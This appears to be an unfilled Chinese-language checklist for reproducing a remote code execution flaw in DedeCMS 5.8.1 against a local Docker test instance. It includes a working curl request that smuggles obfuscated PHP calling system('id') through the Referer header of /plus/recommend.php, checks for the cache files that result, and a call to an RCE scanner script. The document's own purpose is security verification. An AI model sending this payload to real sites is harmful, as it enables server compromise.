# 真机复现证据（待填）

状态：**未执行**。本机无 PHP 运行时、无 Docker，未在真实 5.8.1 实例上抓取响应。以下为复现步骤与验收项，跑完把结果贴进对应位置。

## 1. 靶机

```bash
docker run -d --name dede581 -p 8080:80 php:7.4-apache
docker exec -it dede581 bash -c "apt-get update && apt-get install -y unzip default-mysql-client"
# 解压 v5.8.1 到 /var/www/html，data/ 与 uploads/ 可写
chown -R www-data:www-data /var/www/html/data /var/www/html/uploads
```

安装向导走完，或手工写入 `data/common.inc.php` 与 `data/config.cache.inc.php`。

## 2. 单请求验证

```bash
curl -s -o resp.html -w "%{http_code}\n" \
  -H "Referer: <?php \$a='syste';\$b='m';\$c=\$a.\$b;echo 'BGN-';echo \$c('id');?>" \
  "http://127.0.0.1:8080/plus/recommend.php"
grep -o "BGN-[^<]*" resp.html
```

验收：响应体出现 `BGN-uid=33(www-data) gid=33(www-data)` 一类输出。

## 3. 缓存落盘

```bash
docker exec dede581 bash -c "ls -lt /var/www/html/data/tplcache/ | grep string_ | head"
docker exec dede581 bash -c "grep -l '<?php' /var/www/html/data/tplcache/string_*.inc | head"
```

验收：列出 `string_<md5>.inc`，其中至少一个含 `<?php` 与本次标记。

## 4. 扫描器结果

```bash
python tools/dedecms_581_rce_scan.py -u http://127.0.0.1:8080 --json out.jsonl
```

验收：`out.jsonl` 中至少有 `"endpoint": "recommend"` 的行满足 `"written": true, "executed": true`。

## 5. 待填

| 项 | 结果 |
| --- | --- |
| 靶机版本 / PHP 版本 | [待填] |
| 命中入口 | [待填] |
| 响应片段 | [待填] |
| `string_*.inc` 文件名 | [待填] |
| 扫描器 JSON 行 | [待填] |
